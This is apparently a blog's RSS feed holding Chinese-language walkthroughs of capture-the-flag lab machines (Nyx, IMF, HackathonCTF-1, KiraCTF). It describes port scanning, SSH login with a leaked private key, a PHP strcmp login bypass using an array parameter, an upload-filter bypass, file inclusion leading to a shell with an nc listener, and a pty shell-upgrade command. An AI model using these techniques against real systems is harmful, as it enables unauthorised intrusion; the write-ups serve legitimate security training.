@@ -1,0 +1,1346 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>靶机 on 1ux4ry Archive</title><link>https://luxuryzcx.github.io/categories/%E9%9D%B6%E6%9C%BA/</link><description>Recent content in 靶机 on 1ux4ry Archive</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Mon, 15 Jun 2026 20:25:12 +0800</lastBuildDate><atom:link href="https://luxuryzcx.github.io/categories/%E9%9D%B6%E6%9C%BA/index.xml" rel="self" type="application/rss+xml"/><item><title>Nyx</title><link>https://luxuryzcx.github.io/posts/nyx/</link><pubDate>Mon, 15 Jun 2026 20:25:12 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/nyx/</guid><description>&lt;h1 id="一信息搜集"&gt;&lt;strong&gt;一.信息搜集&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;1.主机探测&lt;/p&gt;
+&lt;p&gt;发现靶机的地址为 192.168.247.208&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244021552-4863f6be-72ce-4ab6-878f-76c829d0420e.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;2.端口扫描&lt;/p&gt;
+&lt;p&gt;nmap -sS -A -p- 192.168.247.208 发现开放了22和80端口&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244028215-528a63e4-c900-4637-a151-25ca0817fa9c.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;3.漏洞扫描&lt;/p&gt;
+&lt;p&gt;nikto扫描发现了靶机的一些版本信息，包括一些漏洞&lt;/p&gt;
+&lt;p&gt;nikto -h 192.168.247.208&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244037441-2bd1e069-4f51-43c4-adf4-9c67b4e4be84.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;nmap漏洞扫描&lt;/p&gt;
+&lt;p&gt;nmap &amp;ndash;script=vuln -p22,80 192.168.247.208&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244044091-fe3db2b1-fe87-4cc2-85cb-92ed15e030ec.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h1 id="二调试测试"&gt;二.调试测试&lt;/h1&gt;
+&lt;p&gt;1.web渗透+信息搜集&lt;/p&gt;
+&lt;p&gt;访问原页面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244052068-213731a6-c4c6-48de-ac27-d671c1f5c6df.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;查看网页源代码并无有效信息&lt;/p&gt;
+&lt;p&gt;访问我们开始利用namp扫描出来的 那个目录：&lt;code&gt;**/d41d8cd98f00b204e9800998ecf8427e.php**&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现是个open ssh私钥 我们后面可以尝试用openssh私钥进行免密码登录 ssh&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244062132-ddc39f92-36d6-45cc-8727-86f818c47fd0.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;2.我们将靶机的openssh私钥,保存到id_rsa文件里 后面利用这个私钥进行免密码登录&lt;/p&gt;
+&lt;p&gt;我们现在尝试寻找ssh登录的用户，在实际的渗透测试下，如果我们没有找到ssh私钥的用户，我们可以尝试下root用户，但是这个靶场不是root用户&lt;/p&gt;
+&lt;p&gt;ssh -i id_rsa &lt;a href="mailto:root@192.168.247.208"&gt;root@192.168.247.208&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244068806-d9aed076-9235-4434-8210-b73fc37cb40b.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244075650-dc918191-5241-4a22-a6e7-767c72b971a5.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;返回页面 发现这个用户是mpampis的&lt;/p&gt;
+&lt;p&gt;私钥文件 “id_rsa” 的权限设置有问题。SSH 客户端要求私钥文件的权限必须是非常严格的，通常是 600 或者 400，表示只有拥有者才可读写。&lt;/p&gt;
+&lt;p&gt;chmod 600 id_rsa&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244082185-725c1657-2385-4ada-9e86-8515542ead40.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;利用其进行登录&lt;/p&gt;
+&lt;p&gt;ssh -i id_rsa &lt;a href="mailto:mpampis@192.168.247.208"&gt;mpampis@192.168.247.208&lt;/a&gt; 发现登录成功&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244091210-062e4fdd-6855-4a37-b3ce-4bf449472d18.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;3.user.txt 拿到root的flag&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2025/png/46138799/1744244098174-926f2d1a-6207-4ad4-928b-e42b5e7c1593.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h1 id="三提权"&gt;三.提权&lt;/h1&gt;
+&lt;p&gt;1.sudo提权&lt;/p&gt;
+&lt;p&gt;cat /etc/crontab查看是否有定时进程，发现没有定时任务&lt;/p&gt;</description></item><item><title>IMF</title><link>https://luxuryzcx.github.io/posts/imf/</link><pubDate>Mon, 15 Jun 2026 20:24:51 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/imf/</guid><description>&lt;h1 id="1信息收集"&gt;1.信息收集&lt;/h1&gt;
+&lt;h2 id="1主机发现"&gt;1.主机发现&lt;/h2&gt;
+&lt;p&gt;因为靶机与宿主机在同一网段，所以用二级扫描来发现靶机ip &lt;strong&gt;arp-scan -l&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;发现目标主机 &lt;strong&gt;192.168.170.59&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692384-e76f134a-9308-42ae-97fb-4c803169c1af.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h2 id="2端口扫描"&gt;2.端口扫描&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -sC -sV -O 192.168.170.59
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;//-sC常见漏洞脚本扫描 -sV开放端口服务/版本号 -O操作系统探测&lt;/p&gt;
+&lt;p&gt;发现就开了一个80端口&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692431-9e73893c-3fd3-45ba-8ad2-e7f98c52553d.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h2 id="3访问web服务"&gt;3.访问web服务&lt;/h2&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692361-835534ee-1771-4a33-a38c-de13beafa023.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+点击如图选项&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692310-02b87da7-ec80-4e82-8ea2-4b81e087ddd9.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;右击查看源代码发现第一个flag flag1{YWxsdGhlZmlsZXM=}&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410692547-4c944ab4-e883-4331-ad99-40c7b2e7018a.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;易知是base64编码进行解码 得到字符串：allthefiles&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410694505-badf35ef-69d0-4781-830f-0f83feee15d0.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;点击首页第一个选项查看源码，这三段有点像base64编码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695017-48a90511-8cc2-4b5c-8519-a0d6be61bca1.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;这三段进行拼接 ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==&lt;/p&gt;
+&lt;p&gt;base64解码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695022-be34df30-a69b-4926-8011-597f05fce5f6.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;得到 flag2{aW1mYWRtaW5pc3RyYXRvcg==}&lt;/p&gt;
+&lt;p&gt;再进行解码 得到 imfadministrator&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695308-cdb787ab-31b6-4970-81f9-ec25a91e9fda.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;访问一下imfadministrator路径，发现是一个登陆界面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695500-ef800930-dcb0-4440-92dd-b5621a420319.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+查看网页源码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410695827-d62e1067-d2af-4d47-be54-15169ce98713.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;随便输入用户名和密码，点登录，页面回显提示：“无效的用户名”&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696315-93b624b2-36ff-4b1e-93a8-678d7d318b3f.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696229-cd7db54a-c5b4-4e4e-b777-2ab4b478a4b5.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;使用第一个用户名（rmichaels）登录时，发现页面回显变成了“无效的密码”，说明我们的用户名是正确的&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696377-0f77d2a2-63ab-4266-94c3-63921ec3bdcc.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;既然知道了正确的用户名，就可以使用burpsuite抓包爆破出密码，右键，选择转发到Intruder&lt;br&gt;
+但是抓包爆破密码太慢了我们选择放弃&lt;/p&gt;
+&lt;h1 id="2漏洞利用"&gt;2.漏洞利用&lt;/h1&gt;
+&lt;p&gt;burp抓包进行绕过&lt;br&gt;
+这里参考代码php strcmp比较字符串绕过：字符串和数组进行比较&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696698-c8f8d8b6-e5ac-497c-a350-3c09a270d486.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;a的输入为非字符串类型数据，就会报错，自动return 0&lt;br&gt;
+我们可以将pass以数组的方式传输数据，使其报错。//pass后面加上[]&lt;br&gt;
+得到flag3{Y29udGludWVUT2Ntcw==}&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410696950-128a7811-514d-46b1-832a-4a18faca7cc8.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;进行解码 continueTOcms&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697364-19d3af84-f9de-4a7b-923e-15fba3461c64.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;关闭抓包，页面跳转到如下界面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697408-2eded067-1d77-4c10-bd28-923883fa8855.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;点击IMF CMS进入新的页面&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://cdn.nlark.com/yuque/0/2024/png/46138799/1731410697624-25374a55-1d87-48a0-b394-1bb6a9cbd183.png"
+ alt=""
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;</description></item><item><title>HackathonCTF-1 靶机</title><link>https://luxuryzcx.github.io/posts/hackathonctf-1-%E9%9D%B6%E6%9C%BA/</link><pubDate>Mon, 15 Jun 2026 20:20:13 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/hackathonctf-1-%E9%9D%B6%E6%9C%BA/</guid><description>&lt;p&gt;开放21，23，80，7223端口&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;c┌──(root㉿kali)-/home/kali/桌面]└─# nmap -p- 61.139.2.134 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 08:55 ESTNmap scan report for 61.139.2.134Host is up (0.00072s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp23/tcp open telnet80/tcp open http7223/tcp open unknownMAC Address: 00:0C:29:FA:24:A1 (VMware)Nmap done: 1 IP address (1 host up) scanned in 1.66 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;[&lt;/p&gt;
+&lt;p&gt;看一下80端口，发现有一个robots.txt&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118214914232.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;br&gt;
+这里我们进行解密，发现有一个东西&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260118214943933.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;解密完成后发现是这样&lt;/p&gt;
+&lt;p&gt;ssh-bruteforce-sudoit&lt;/p&gt;
+&lt;p&gt;发现需要我们对那个ssh端口进行爆破处理，接下来我们进行对7223端口进行识别探测&lt;/p&gt;
+&lt;p&gt;nmap -sV -p 7223 61.139.2.134&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;c┌──(root㉿kali)-/home/kali/桌面]└─# nmap -sV -p 7223 61.139.2.134Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-18 08:56 ESTNmap scan report for 61.139.2.134Host is up (0.00047s latency).PORT STATE SERVICE VERSION7223/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)MAC Address: 00:0C:29:FA:24:A1 (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;[&lt;/p&gt;</description></item><item><title>KiraCTF</title><link>https://luxuryzcx.github.io/posts/kiractf/</link><pubDate>Mon, 15 Jun 2026 20:19:58 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/kiractf/</guid><description>&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119224818718.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;开放80端口&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119224906661.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;访问，发现就有一个文件上传的，估计有漏洞的&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119225011481.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;发现上传php被过滤了，后面看了wp需要进行加一个jpg后缀进行绕过&lt;/p&gt;
+&lt;p&gt;点开那个language发现存在那个文件包含漏洞&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260119231621951.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;我们来上传一个木马来试一试&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260202233212451.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后进行远程命令进行包含&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260202233201758.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后此时进行nc命令监听&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260202233324937.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cwww&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;home&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt; &lt;span class="n"&gt;lslsDesktopDocumentsDownloadsMusicPicturesPublicTemplatesVideosexamples&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;desktopuser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现关键的user.txt文件,发现读取不了，命令被禁止了&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cwww-data@bassam-aziz:/home/bassam$ cat user.txt cat user.txtcat: user.txt: Permission denied
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再次进行信息搜集&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cwww&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt; &lt;span class="n"&gt;lslsindex&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;htmllanguage&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;phpsupersecret&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;azizupload&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;phpuploadswww&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现有东西&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cwww&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;supersecret&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;aziz&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt; &lt;span class="n"&gt;cat&lt;/span&gt; &lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txtcat&lt;/span&gt; &lt;span class="n"&gt;bassam&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;txtPassword123&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看到了里面的密码&lt;/p&gt;
+&lt;p&gt;尝试登录，然后发现是这样的，但是必须是一个交互的终端才可，必须先要开启&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cpython3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后发现登录成功&lt;/p&gt;
